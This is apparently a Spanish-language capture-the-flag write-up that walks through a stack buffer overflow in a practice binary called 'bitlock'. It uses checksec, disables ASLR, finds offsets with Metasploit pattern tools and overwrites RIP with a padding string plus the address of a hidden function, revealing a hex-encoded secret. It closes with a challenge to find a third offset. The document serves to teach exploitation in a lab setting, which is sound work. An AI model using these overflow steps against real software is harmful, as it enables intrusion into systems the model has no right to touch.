# Bitlock

comenzamos validando las protecciones del binario

```ruby
checksec --file=bitlock
```

![image](https://github.com/user-attachments/assets/8f1d12d8-6493-461d-bc35-675d4ce078f4)

vemos que solo cuenta con PIE (esta proteccion se encarga de aleatorizar las direcciones de memoria de las funciones en el binario), lo primero que hare
sera deshabilitar el ASLR

```ruby
sysctl -w kernel.randomize_va_space=0
```

ahora corro el binario con un depurador `gdb`

```ruby
gdb ./bitlock
```
chequeo las funciones que contiene el binario

```ruby
info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001030  puts@plt
0x0000000000001040  printf@plt
0x0000000000001050  __isoc99_scanf@plt
0x0000000000001060  strcat@plt
0x0000000000001070  __cxa_finalize@plt
0x0000000000001080  _start
0x00000000000010b0  deregister_tm_clones
0x00000000000010e0  register_tm_clones
0x0000000000001120  __do_global_dtors_aux
0x0000000000001160  frame_dummy
0x0000000000001169  boff
0x000000000000138e  register_user
0x000000000000146d  main
0x0000000000001484  _fini
```
observamos una funcion llamada boff con direccion de memoria `0x0000000000001169` que si ejecuto el binario la mas probable es que esa direccion cambie, asi 
que hacemos la prueba

![image](https://github.com/user-attachments/assets/312d996f-2170-42b6-b15a-03725be09000)

en efecto a cambiado la direccion de memoria pero esta vez si se mantiene la direccion de memoria `0x555555555169`, ahora buscare como calcular el offset, primero
generamos una cadena especial con el exploit de `metasploit` 

```ruby
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
```
obtenemos la cadena:

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
```

esta cadena la pasare en los diferentes datos que me solicita el binario

![image](https://github.com/user-attachments/assets/46c1f5b6-0c79-466b-a0e3-94a795b9ff42)

calculo el `offset` en el campo nombre con otro exploit de `metasploit`

```ruby
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6341356341346341
```

me devuelve un `offset` de 72; continuo haciendo pruebas en el binario en los demas campos que solicita sean llenados

![image](https://github.com/user-attachments/assets/23150170-cfba-4779-92d4-f695c91de196)


![image](https://github.com/user-attachments/assets/ed8f31c0-276c-4a2b-bf28-e185ecb96dda)

el `offset` en el campo `pais de residencia` es 136 y podria continuar probando los demas campos pero me quedare con este ultimo `offset` y realizare
pruebas a ver si llego a controlar el `rip`

```ruby
python3 -c 'print("A"*136+"B"*6)'

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB
```
le envio 136 A y 6 B en la entrada de `pais de residencia` al binario, si esto resultara en el control del `rip`, deberia escribirse `0x0000424242424242`

![image](https://github.com/user-attachments/assets/97d45834-7a42-4e57-99b7-9db6fd293d4c)

hemos tomado control sobre `rip`, ahora chequeo si aun se mantiene la misma direccion de memoria de la funcion `boff`

![image](https://github.com/user-attachments/assets/5080c8a2-12ed-47aa-adbe-f2902b18c8fd)

se continua manteniendo, asi que intentare apuntar a ella para redirigir el flujo del programa a la funcion `boff`, para lograr esto primero pasare la direccion de 
memoria de la funcion `boff` a texto

![image](https://github.com/user-attachments/assets/42be1c67-6458-4a65-a3e5-105c3ecff926)

recordemos que la direccion de memoria siempre se debe ingresar al contrario...; la traduccion de la direccion de memoria a texto seria `iQUUUU`, esto quiere decir,
si le pasamos eso al binario para que lo escriba en el `rip` estaria apuntando a la direccion de memoria de la funcion `boff`

![image](https://github.com/user-attachments/assets/b15f3cd9-b970-48c5-bddf-09b54e7fdc55)

pasamos esta cadena al binario por la entrada `pais de residencia`

![image](https://github.com/user-attachments/assets/e8974d8b-b5d3-498e-b68b-b073c752729b)

esta vez observamos nos devuelve una cadena que antes no nos devolvia el binario `737562646f6d696e696f3a64333277703532736131`; logrando asi explotar el `bof`...

si recordamos, teniamos tambien un `offset` con valor `72` por lo que ahora vere si logro el mismo resultado con este `offset` en el campo `nombre` en el binario

![image](https://github.com/user-attachments/assets/18cdd58f-4f7e-48fc-b4ff-d20e3084b8b0)

![image](https://github.com/user-attachments/assets/12840df7-37ea-485b-a401-d2dbe9c4491d)

hemos explotado el `bof` en otro campo del binario

```
Nota:

El objetivo de este ejercicio es comprender como realizar la explotacion de un bof
de forma mucho mas manual, para asi aprender mejor su funcionamiento y saber que un binario
con multiples entradas de datos podria ser explotado a traves de varias entradas y no solo por una,
como en este caso que llegamos a obtener 2 valores offset
```

```
Reto:

Localiza un tercer valor offset y explota el BOF
```
